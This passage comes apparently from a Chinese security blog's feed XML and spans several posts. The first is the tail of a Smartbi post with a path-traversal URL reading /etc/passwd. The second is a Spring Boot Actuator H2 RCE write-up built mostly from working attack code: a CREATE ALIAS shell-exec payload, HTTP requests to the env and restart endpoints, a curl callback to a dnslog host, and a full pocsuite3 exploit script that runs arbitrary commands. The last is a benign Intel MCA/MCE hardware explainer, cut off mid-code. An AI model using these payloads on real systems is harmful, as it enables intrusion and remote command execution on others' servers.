<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;FileServlet?ftpType&#x3D;out&amp;path&#x3D;upload&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&amp;name&#x3D;%E4%B8%AD%E5%9B%BD%E7%9F%B3%E6%B2%B9%E5%90%89%E6%9E%97%E7%99%BD%E5%9F%8E%E9%94%80%E5%94%AE%E5%88%86%E5%85%AC%E5%8F%B8XX%E5%8A%A0%E6%B2%B9%E7%AB%99%E9%98%B2%E9%9B%B7%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88.docx</span><br></pre></td></tr></table></figure>

<p>[<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112145403202.png" alt="image-20210112145403202"></p>
<p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112182330751.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112182330751.png" alt="image-20210112182330751"></a></p>
<blockquote>
<p>转载：<a href="http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/">http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Smartbi</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot Actuator H2 RCE漏洞复现</title>
    <url>/2021/01/22/WEB/Exploit/springboot/Spring-Boot-Actuator-H2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>Spring Boot框架是最流行的基于Java的微服务框架之一，可帮助开发人员快速轻松地部署Java应用程序，加快开发过程。当Spring Boot Actuator配置不当可能造成多种RCE，因为Spring Boot 2.x默认使用HikariCP数据库连接池，所以可通过H2数据库实现RCE。</p>
<h1 id="HikariCP数据库连接池"><a href="#HikariCP数据库连接池" class="headerlink" title="HikariCP数据库连接池"></a>HikariCP数据库连接池</h1><blockquote>
<p>之前的两个RCE都是在Spring Boot 1.x版本下进行的，在spring 2.x下的版本如何进行RCE呢。幸运的是，Spring Boot 2.x默认使用的HikariCP数据库连接池提供了一个可以RCE的变量。这个变量就是<code>spring.datasource.hikari.connection-test-query</code>。这个变量与HikariCP中的<code>connectionTestQuery</code>配置相匹配。根据文档，此配置定义的是在从池中给出一个连接之前被执行的query，它的作用是验证数据库连接是否处于活动状态。简言之，无论何时一个恶心的数据库连接被建立时，<code>spring.datasource.hikari.connection-test-query</code>的值将会被作为一个SQL语句执行。然后利用SQL语句中的用户自定义函数，进行RCE。</p>
</blockquote>
<a id="more"></a>

<h1 id="H2-CREATE-ALIAS-命令"><a href="#H2-CREATE-ALIAS-命令" class="headerlink" title="H2 CREATE ALIAS 命令"></a>H2 CREATE ALIAS 命令</h1><p>H2数据库引擎是一个流行的java开发数据库，非常容易与Spring Boot集成，仅仅需要如下的一个dependency。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.h2database&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;h2&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;scope&gt;runtime&lt;&#x2F;scope&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>

<p>在H2中有一个非常重要的命令，与PostgreSQL中的用户定义函数相似，可以用CREATE ALIAS创建一个java函数然后调用它，示例如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS GET_SYSTEM_PROPERTY FOR &quot;java.lang.System.getProperty&quot;;</span><br><span class="line">CALL GET_SYSTEM_PROPERTY(&#39;java.class.path&#39;);</span><br></pre></td></tr></table></figure>

<p>仿照这个，创建命令执行的java函数可以如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String shellexec(String cmd) throws java.io.IOException &#123; </span><br><span class="line">    java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">    if (s.hasNext()) &#123;</span><br><span class="line">        return s.next();</span><br><span class="line">    &#125; throw new IllegalArgumentException(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么RCE所需的SQL语句即:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS &quot;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&quot;;</span><br><span class="line">CALL EXEC(&#39;curl ntxo6i.dnslog.cn&#39;);</span><br></pre></td></tr></table></figure>

<p>与1.x类似，在端点<code>/actuator/env</code>通过POST方法进行环境变量的赋值。payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">content-type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;curl ntxo6i.dnslog.cn&#39;);&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>执行RCE的SQL语句已经构建好，接下来就是触发一个新的数据库连接，通过向端点<code>/actuator/restart</code>发送POST请求，即可重启应用出发新的数据库连接。请求如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">content-type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122104659742.png" alt="image-20210122104659742"></p>
<p>命令执行的结果:</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122104154963.png" alt="image-20210122104154963"></p>
<h1 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">import time</span><br><span class="line">from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE</span><br><span class="line">from pocsuite3.api import OptString</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class DemoPOC(POCBase):</span><br><span class="line">    vulID &#x3D; &#39;00000&#39;  # ssvid</span><br><span class="line">    version &#x3D; &#39;1.0&#39;</span><br><span class="line">    author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">    vulDate &#x3D; &#39;2020-1-22&#39;</span><br><span class="line">    createDate &#x3D; &#39;2020-1-22&#39;</span><br><span class="line">    updateDate &#x3D; &#39;2020-1-22&#39;</span><br><span class="line">    references &#x3D; [&#39;&#39;]</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    appPowerLink &#x3D; &#39;https:&#x2F;&#x2F;spring.io&#x2F;projects&#x2F;spring-boot&#39;</span><br><span class="line">    appName &#x3D; &#39;spring-boot&#39;</span><br><span class="line">    appVersion &#x3D; &#39;2.x&#39;</span><br><span class="line">    vulType &#x3D; VUL_TYPE.XSS</span><br><span class="line">    desc &#x3D; &#39;&#39;&#39;springboot H2 Rce&#39;&#39;&#39;</span><br><span class="line">    samples &#x3D; []</span><br><span class="line">    category &#x3D; POC_CATEGORY.EXPLOITS.WEBAPP</span><br><span class="line"></span><br><span class="line">    def _options(self):</span><br><span class="line">        o &#x3D; OrderedDict()</span><br><span class="line">        o[&quot;exec&quot;] &#x3D; OptString(&#39;&#39;, description&#x3D;&#39;Please input your exec&#39;, require&#x3D;True)</span><br><span class="line">        return o</span><br><span class="line"></span><br><span class="line">    def _verify(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        url &#x3D; self.url</span><br><span class="line">        url1 &#x3D; self.url + &#39;&#x2F;actuator&#x2F;env&#39;</span><br><span class="line">        url2 &#x3D; self.url + &#39;&#x2F;actuator&#x2F;restart&#39;</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;%s&#39;);&quot;&#125;&#39;&#39;&#39; % (self.get_option(&quot;exec&quot;)) </span><br><span class="line">        headers &#x3D; &#123;&#39;content-type&#39; : &#39;application&#x2F;json&#39;&#125;</span><br><span class="line">    </span><br><span class="line">        r1 &#x3D; requests.post(url1, data&#x3D;payload, headers&#x3D;headers)</span><br><span class="line">        #time.sleep(2)</span><br><span class="line">        r2 &#x3D; requests.post(url2, data&#x3D;payload, headers&#x3D;headers)</span><br><span class="line">        if r1.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; self.url</span><br><span class="line">            result[&#39;VerifyInfo&#39;][&#39;Postdata&#39;] &#x3D; (self.get_option(&quot;exec&quot;))</span><br><span class="line"></span><br><span class="line">        return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        return self._verify()</span><br><span class="line"></span><br><span class="line">    def parse_output(self, result):</span><br><span class="line">        output &#x3D; Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122113322544.png" alt="image-20210122113322544"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122113340410.png" alt="image-20210122113340410"></p>
<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级到安全版本</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title>Intel MCA与MCE硬件机制概述</title>
    <url>/2021/01/22/IOT/Intel-MCA%E4%B8%8EMCE%E7%A1%AC%E4%BB%B6%E6%9C%BA%E5%88%B6%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>Intel从奔腾4开始的CPU中增加了一种机制，称为MCA——Machine Check Architecture，它用来检测硬件（这里的Machine表示的就是硬件）错误，比如系统总线错误、ECC错误等等。</p>
<p>这套系统通过一定数量的MSR（Model Specific Register）来实现，这些MSR分为两个部分，一部分用来进行设置，另一部分用来描述发生的硬件错误。</p>
<p>当CPU检测到不可纠正的MCE（Machine Check Error）时，就会触发#MC（Machine Check Exception），通常软件会注册相关的函数来处理#MC，在这个函数中会通过读取MSR来收集MCE的错误信息，然后重启系统。当然由于发生的MCE可能是非常致命的，CPU直接重启了，没有办法完成MCE处理函数；甚至有可能在MCE处理函数中又触发了不可纠正的MCE，也会导致系统直接重启。</p>
<p>当然CPU还会检测到可纠正的MCE，当可纠正的MCE数量超过一定的阈值时，会触发CMCI（Corrected Machine Check Error Interrupt），此时软件可以捕捉到该中断并进行相应的处理。CMCI是在MCA之后才加入的，算是对MCA的一个增强，在此之前软件只能通过轮询可纠正MCE相关的MSR才能实现相关的操作。</p>
 <a id="more"></a>

<h1 id="Machine-Check-MSR"><a href="#Machine-Check-MSR" class="headerlink" title="Machine Check MSR"></a>Machine Check MSR</h1><p>前面已经说过，MCA是通过一系列的MSR来实现，这里介绍下这些MSR寄存器，首先看下面的图：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170317231245479.png" alt="img"></p>
<p>上图基本包含了MCA相关的所有MSR。</p>
<p>它分为左右两个部分，左边的是全局的寄存器，右边表示的是多组寄存器。</p>
<p>i表示的是各个组的Index。这里的组有一个称呼是Error Reporting Register Bank。</p>
<p>MCA通过若干Bank的MSR寄存器来表示各种类型的MCE。</p>
<p>下面简单介绍一下这些寄存器。</p>
<h2 id="IA32-MCG-CAP-MSR"><a href="#IA32-MCG-CAP-MSR" class="headerlink" title="IA32_MCG_CAP MSR"></a>IA32_MCG_CAP MSR</h2><p>这个MSR描述了当前CPU处理MCA的能力，具体每个位的作用如下所示：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170317231629130.png" alt="img"></p>
<p><strong>BIT0-7</strong>：表示的是CPU支持的Bank的个数；</p>
<p><strong>BIT8</strong>：1表示IA32_MCG_CTL有效，如果是0的话表示无效，读取该IA32_MCG_CTL这个MSR可能发生Exception（至少在UEFI下是这样）；</p>
<p><strong>BIT9</strong>：1表示IA32_MCG_EXT_CTL有效，反之无效，这个与BIT8的作用类似；</p>
<p><strong>BIT10</strong>：1表示支持CMCI，但是CMCI是否能用还需要通过IA32_MCi_CTL2这个MSR的BIT30来使能；</p>
<p><strong>BIT11</strong>：1表示IA32_MCi_STATUS这个MSR的BIT56-55是保留的，BIT54-53是用来上报Threshold-based Error状态的；</p>
<p><strong>BIT16-23</strong>：表示存在的Extended Machine Check State寄存器的个数；</p>
<p><strong>BIT24</strong>：1表示CPU支持Software Error Recovery；</p>
<p><strong>BIT25</strong>：1表示CPU支持增强版的MCA；</p>
<p><strong>BIT26</strong>：1表示支持更多的错误记录（需要UEFI、ACPI的支持）；</p>
<p><strong>BIT27</strong>：1表示支持Local Machine Check Exception；</p>
<h2 id="IA32-MCG-STATUS-MSR"><a href="#IA32-MCG-STATUS-MSR" class="headerlink" title="IA32_MCG_STATUS MSR"></a>IA32_MCG_STATUS MSR</h2><p>该MSR记录了MCE发生时CPU的状态，主要的BIT位介绍如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170317232838256.png" alt="img"></p>
<p>这里的IP指的是Instruction Pointer，指向当前的CPU指令；</p>
<p>EIPV为1时表示当前的指令与导致MCE的原因相关；RIPV为1表示当前CPU从当前指令继续执行并不会有什么问题；</p>
<p>但是还是不知道这两个BIT有什么用处…</p>
<h2 id="IA32-MCG-CTL-MSR"><a href="#IA32-MCG-CTL-MSR" class="headerlink" title="IA32_MCG_CTL MSR"></a>IA32_MCG_CTL MSR</h2><p>这个寄存器的存在依赖于IA32_MCG_CAP这个MSR的BIT8。</p>
<p>这个寄存器主要用来Disable（写1）或者Enable（写全0）MCA功能。</p>
<h2 id="IA32-MCG-EXT-CTL-MSR"><a href="#IA32-MCG-EXT-CTL-MSR" class="headerlink" title="IA32_MCG_EXT_CTL MSR"></a>IA32_MCG_EXT_CTL MSR</h2><p>这个寄存器同样依赖于IA32_MCA_CAP这个MSR，这次依赖的是BIT9。该MSR的BIT位说明如下图所示：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318212749233.png" alt="img"></p>
<p>目前有就BIT0有用，用来Disable（写1）或者Enable（写0）LMCE，这个LMCE的功能就是使硬件能够将某些MCE发送给单个的逻辑处理器，为什么要这样做目前还不是很 清楚。</p>
<p>以上都是全局的MSR，下面介绍每个Bank对应的MSR，</p>
<p>这些寄存器的第一个是IA32_MC0_CTL，它的地址一般都是400H。之后接着的是IA32_MC0_STATUS，IA32_MC0_ADDR，IA32_MC0_MISC，但是在之后并不是IA32_MC0_CTL2，而是IA32_MC1_CTL；对于IA32_MCi_CTL2来说，它的地址跟上面的这些不在一起，第一个IA32_MC0_CTL2是在280H，之后是IA32_MC1_CTL2在281H，以此类推。</p>
<h2 id="IA32-MCi-CTL-MSRs"><a href="#IA32-MCi-CTL-MSRs" class="headerlink" title="IA32_MCi_CTL MSRs"></a>IA32_MCi_CTL MSRs</h2><p>每个Bank的CTL的作用是用来控制在发生哪些MCA的时候来触发#MC：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318214515306.png" alt="img"></p>
<p>这里的64个BIT位，设置某个BIT位就会使对应BIT位的MCA类型在发生时触发#MC。</p>
<h2 id="IA32-MCi-STATUS-MSRS"><a href="#IA32-MCi-STATUS-MSRS" class="headerlink" title="IA32_MCi_STATUS MSRS"></a>IA32_MCi_STATUS MSRS</h2><p>这类MSR的作用就是显示MCE信息：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318214829962.png" alt="img"></p>
<p>注意只有当VAL这个BIT位（BIT63）为1时才表示发生了对应这个Bank的MCE。当MCE发生了，软件需要给这个VAL位写0来清零（如果有可能的话，因为对于不可纠正的MCE可能软件会 来不及写），不能往这位写1，会出现Exception。</p>
<p><strong>BIT0-15</strong>，<strong>BIT16-31</strong>：这个两个部分都表示MCE的错误类型，前者是通用的，后者是跟CPU有关的；</p>
<p><strong>BIT58</strong>：1表示IA32_MCi_ADDR这个MSR是有效的，反之无效；</p>
<p><strong>BIT59</strong>：1表示IA32_MCi_MISC这个MSR是有效的，反之无效；这两个BIT是因为不同MCE错误并不是都需要ADDR和MSIC这样的MSR；</p>
<p><strong>BIT60</strong>：这个位于IA32_MCi_CTL中的位是对应的，那边使能了，这里就是1；</p>
<p><strong>BIT61</strong>：表示MCE是不可纠正的；</p>
<p><strong>BIT62</strong>：表示发生了二次的MCE，这个时候到底这个Bank表示的是哪一次的MCE信息，需要根据一定的规则来确定：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318220204252.png" alt="img"></p>
<p>这个可以先不关注。</p>
<p>另外还有一些寄存器在这里不介绍，具体还是看手册。</p>
<h2 id="IA32-MCi-ADDR-MSRs"><a href="#IA32-MCi-ADDR-MSRs" class="headerlink" title="IA32_MCi_ADDR MSRs"></a>IA32_MCi_ADDR MSRs</h2><p>这个MSR并没有特别好介绍的：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318220343081.png" alt="img"></p>
<p>这个地址指向内存中导致MCE的代码或者数据。</p>
<p>注意这个地址在不同的内存模型下可以是偏移地址，虚拟地址和物理地址中的一种，这个需要MISC这个MSR来确定，下面胡讲到。</p>
<p>这个MSR也可以手动清零，写1会出错。</p>
<h2 id="IA32-MCi-MISC-MSRs"><a href="#IA32-MCi-MISC-MSRs" class="headerlink" title="IA32_MCi_MISC MSRs"></a>IA32_MCi_MISC MSRs</h2><p>这个寄存器的BIT位说明如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318220816162.png" alt="img"></p>
<p>这里的Address Mode说明如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318220902442.png" alt="img"></p>
<h2 id="IA32-MCi-CTL2-MSRs"><a href="#IA32-MCi-CTL2-MSRs" class="headerlink" title="IA32_MCi_CTL2 MSRs"></a>IA32_MCi_CTL2 MSRs</h2><p>这个寄存器就是为CMCI使用的，BIT位说明如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318222559843.png" alt="img"></p>
<p>一个是用于使能CMCI，另一个是用来设置CMCI的阈值。</p>
<p>除了上述的MSR之外，在IA32_MCG_CAP这个MSR的说明中还提到过它的BIT16-23还提到了额外的MSR，它们称为Extended Machine Check State，这些MSR的描述如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170318223004472.png" alt="img"></p>
<p>上图实际上只展示了非64位CPU的MSR，还有一个64位CPU的MSR，这里就不再多说。</p>
<p>需要注意，实际上上面的这些寄存器并不需要自己一个个去对比和解析，Intel提供了一个工具叫做<strong>MCE Decoder</strong>，可以用来解析MCE。</p>
<p>另外在Intel的开发者手册中有专门的一个章节解析MCE错误：《CHAPTER 16 INTERPRETING MACHINE-CHECK ERROR CODES》。</p>
<h1 id="CMCI"><a href="#CMCI" class="headerlink" title="CMCI"></a>CMCI</h1><p>前面以及提到，CMCI是后期加入到MCA的一种机制，它将错误上报的阈值操作从原始的软件轮询变成了硬件中断触发。</p>
<p>一个CPU是否支持CMCI需要查看IA32_MCG_CAP的BIT10，如果该位是1就表示支持。</p>
<p>另外CMCI默认是关闭的，需要通过IA32_MCi_CTL2的BIT30来打开，并设置BIT0-14的阈值，注意每个Bank都要设置。</p>
<p>设置的时候首先写1到IA32_MCi_CTL2的BIT30，再读取这个值，如果值变成了1，说明CMCI使能了，否则就是CPU不支持CMCI；之后再写阈值到BIT0-14，如果读出来的值是0，表示不支持阈值，否则就是成功设置了阈值。</p>
<p>CMCI是通过Local ACPI来实现的，具体的示意图如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170319125249342.png" alt="img"></p>
<p>在Local ACPI Table中有专门处理CMCI的寄存器，称为LVT CMCI Register (FEE0 02F0H) ：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20170319125831818.png" alt="img"></p>
<p><strong>BIT0-7</strong>：中断向量；</p>
<p><strong>BIT8-10</strong>：Delivery Mode，比如SMI，NMI等；</p>
<p><strong>BIT12</strong>：Delivery Status，0表示没有中断，1表示中断正在发生；</p>
<p><strong>BIT17</strong>：Interrupt Mask，0表示接收中断，1表示屏蔽中断；</p>
<p>关于CMCI的初始化和CMCI处理函数的实现，手册上有部分的介绍，不过没有什么源代码可以借鉴，这个不展开了。</p>
<h1 id="MCA的初始化"><a href="#MCA的初始化" class="headerlink" title="MCA的初始化"></a>MCA的初始化</h1><p>手册上有一个伪代码可供参考：</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">IF</span> CPU supports MCE</span><br><span class="line"><span class="keyword">THEN</span></span><br><span class="line">	<span class="keyword">IF</span> CPU supports MCA</span><br><span class="line">	<span class="keyword">THEN</span></span><br><span class="line">		<span class="keyword">IF</span> (IA32_MCG_CAP.MCG_CTL_P = <span class="number">1</span>)</span><br><span class="line">		(* IA32_MCG_CTL register <span class="keyword">is</span> present *)</span><br><span class="line">		<span class="keyword">THEN</span></span><br><span class="line">			IA32_MCG_CTL ← FFFFFFFFFFFFFFFFH;</span><br><span class="line">			(* enables all MCA features *)</span><br><span class="line">		FI</span><br><span class="line">		<span class="keyword">IF</span> (IA32_MCG_CAP.MCG_LMCE_P = <span class="number">1</span> <span class="keyword">and</span> IA32_FEATURE_CONTROL.LOCK = <span class="number">1</span> <span class="keyword">and</span> IA32_FEATURE_CONTROL.LMCE_ON= <span class="number">1</span>)</span><br><span class="line">		(* IA32_MCG_EXT_CTL register <span class="keyword">is</span> present <span class="keyword">and</span> platform has enabled LMCE <span class="keyword">to</span> permit system software <span class="keyword">to</span> use LMCE *)</span><br><span class="line">		<span class="keyword">THEN</span></span><br><span class="line">			IA32_MCG_EXT_CTL ← IA32_MCG_EXT_CTL | <span class="number">01</span>H;</span><br><span class="line">			(* System software enables LMCE capability <span class="keyword">for</span> hardware <span class="keyword">to</span> signal MCE <span class="keyword">to</span> a single logical processor*)</span><br><span class="line">		FI</span><br><span class="line">		(* Determine number of <span class="keyword">error</span>-reporting banks supported *)</span><br><span class="line">		COUNT← IA32_MCG_CAP.Count;</span><br><span class="line">		MAX_BANK_NUMBER ← COUNT - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">IF</span> (Processor Family <span class="keyword">is</span> <span class="number">6</span>H <span class="keyword">and</span> Processor EXTMODEL:MODEL <span class="keyword">is</span> less than <span class="number">1</span>AH)</span><br><span class="line">		<span class="keyword">THEN</span></span><br><span class="line">			(* Enable logging of all errors except <span class="keyword">for</span> MC0_CTL register *)</span><br><span class="line">			<span class="keyword">FOR</span> <span class="keyword">error</span>-reporting banks (<span class="number">1</span> through MAX_BANK_NUMBER)</span><br><span class="line">				<span class="keyword">DO</span></span><br><span class="line">					IA32_MCi_CTL ← <span class="number">0</span>FFFFFFFFFFFFFFFFH;</span><br><span class="line">				OD</span><br><span class="line">		<span class="keyword">ELSE</span></span><br><span class="line">			(* Enable logging of all errors including MC0_CTL register *)</span><br><span class="line">			<span class="keyword">FOR</span> <span class="keyword">error</span>-reporting banks (<span class="number">0</span> through MAX_BANK_NUMBER)</span><br><span class="line">				<span class="keyword">DO</span></span><br><span class="line">					IA32_MCi_CTL ← <span class="number">0</span>FFFFFFFFFFFFFFFFH;</span><br><span class="line">				OD</span><br><span class="line">		FI</span><br><span class="line">		(* BIOS clears all errors only <span class="keyword">on</span> power-<span class="keyword">on</span> reset *)</span><br><span class="line">		<span class="keyword">IF</span> (BIOS detects Power-<span class="keyword">on</span> reset)</span><br><span class="line">		<span class="keyword">THEN</span></span><br><span class="line">			<span class="keyword">FOR</span> <span class="keyword">error</span>-reporting banks (<span class="number">0</span> through MAX_BANK_NUMBER)</span><br><span class="line">				<span class="keyword">DO</span></span><br><span class="line">					IA32_MCi_STATUS ← <span class="number">0</span>;</span><br><span class="line">				OD</span><br><span class="line">		<span class="keyword">ELSE</span></span><br><span class="line">			<span class="keyword">FOR</span> <span class="keyword">error</span>-reporting banks (<span class="number">0</span> through MAX_BANK_NUMBER)</span><br><span class="line">				<span class="keyword">DO</span></span><br><span class="line">					(Optional <span class="keyword">for</span> BIOS <span class="keyword">and</span> OS) <span class="built_in">Log</span> valid errors</span><br><span class="line">					(OS only) IA32_MCi_STATUS ← <span class="number">0</span>;</span><br><span class="line">				OD</span><br><span class="line">		FI</span><br><span class="line">	FI</span><br><span class="line">	Setup the Machine Check Exception (#MC) handler <span class="keyword">for</span> vector <span class="number">18</span> <span class="keyword">in</span> IDT</span><br><span class="line">	<span class="keyword">Set</span> the MCE bit (bit <span class="number">6</span>) <span class="keyword">in</span> CR4 register <span class="keyword">to</span> enable Machine-Check Exceptions</span><br><span class="line">FI</span><br></pre></td></tr></table></figure>



<h1 id="MSR的读写"><a href="#MSR的读写" class="headerlink" title="MSR的读写"></a>MSR的读写</h1><p>x86平台读写MSR有专门的指令，分别是rdmsr和wrmsr。下面是MSR读写的一个基本实现：</p>
<p>gcc版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">  Returns a 64-bit Machine Specific Register(MSR).</span><br><span class="line">  Reads and returns the 64-bit MSR specified by Index. No parameter checking is</span><br><span class="line">  performed on Index, and some Index values may cause CPU exceptions. The</span><br><span class="line">  caller must either guarantee that Index is valid, or the caller must set up</span><br><span class="line">  exception handlers to catch the exceptions. This function is only available</span><br><span class="line">  on IA-32 and X64.</span><br><span class="line">  @param  Index The 32-bit MSR index to read.</span><br><span class="line">  @return The value of the MSR identified by Index.</span><br><span class="line">**&#x2F;</span><br><span class="line">UINT64</span><br><span class="line">EFIAPI</span><br><span class="line">AsmReadMsr64 (</span><br><span class="line">  IN      UINT32                    Index</span><br><span class="line">  )</span><br><span class="line">&#123;</span><br><span class="line">  UINT32 LowData;</span><br><span class="line">  UINT32 HighData;</span><br><span class="line">  </span><br><span class="line">  __asm__ __volatile__ (</span><br><span class="line">    &quot;rdmsr&quot;</span><br><span class="line">    : &quot;&#x3D;a&quot; (LowData),   &#x2F;&#x2F; %0</span><br><span class="line">      &quot;&#x3D;d&quot; (HighData)   &#x2F;&#x2F; %1</span><br><span class="line">    : &quot;c&quot;  (Index)      &#x2F;&#x2F; %2</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">  return (((UINT64)HighData) &lt;&lt; 32) | LowData;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;**</span><br><span class="line">  Writes a 64-bit value to a Machine Specific Register(MSR), and returns the</span><br><span class="line">  value.</span><br><span class="line">  Writes the 64-bit value specified by Value to the MSR specified by Index. The</span><br><span class="line">  64-bit value written to the MSR is returned. No parameter checking is</span><br><span class="line">  performed on Index or Value, and some of these may cause CPU exceptions. The</span><br><span class="line">  caller must either guarantee that Index and Value are valid, or the caller</span><br><span class="line">  must establish proper exception handlers. This function is only available on</span><br><span class="line">  IA-32 and X64.</span><br><span class="line">  @param  Index The 32-bit MSR index to write.</span><br><span class="line">  @param  Value The 64-bit value to write to the MSR.</span><br><span class="line">  @return Value</span><br><span class="line">**&#x2F;</span><br><span class="line">UINT64</span><br><span class="line">EFIAPI</span><br><span class="line">AsmWriteMsr64 (</span><br><span class="line">  IN      UINT32                    Index,</span><br><span class="line">  IN      UINT64                    Value</span><br><span class="line">  )</span><br><span class="line">&#123;</span><br><span class="line">  UINT32 LowData;</span><br><span class="line">  UINT32 HighData;</span><br><span class="line"> </span><br><span class="line">  LowData  &#x3D; (UINT32)(Value);</span><br><span class="line">  HighData &#x3D; (UINT32)(Value &gt;&gt; 32);</span><br><span class="line">  </span><br><span 